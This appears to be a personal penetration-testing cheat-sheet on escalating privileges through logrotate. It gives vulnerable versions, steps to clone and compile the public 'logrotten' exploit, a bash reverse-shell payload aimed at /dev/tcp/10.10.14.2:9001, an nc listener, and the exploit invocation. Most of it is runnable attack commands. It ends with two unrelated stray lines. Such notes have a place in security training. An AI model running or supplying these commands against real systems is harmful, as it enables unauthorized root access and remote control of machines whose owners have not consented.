Used to rotate out old log files

**Check config file
```shell-session
cat /etc/logrotate.conf
```

**To force a new rotation on the same day, edit the dat in /var/lib/logrotate.status

**Configuration files for apps located in /etc/logrotate.d/

Exploit requirements:
- Write permissions
- Run as a privileged user or root
- Vulnerable versions:
  - 3.8.6
  - 3.11.0
  - 3.15.0
  - 3.18.0

 **Logrotten
 ```shell-session
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

**Reverse shell
```shell-session
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

**Check if config command is creat or compress
```shell-session
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

**Create listener
```shell-session
nc -lvnp 9001
```

**Run exploit
```shell-session
./logrotten -p ./payload /tmp/tmp.log
```
- Use a valid log file that is writeable

- 137 van
- run report last 7 days

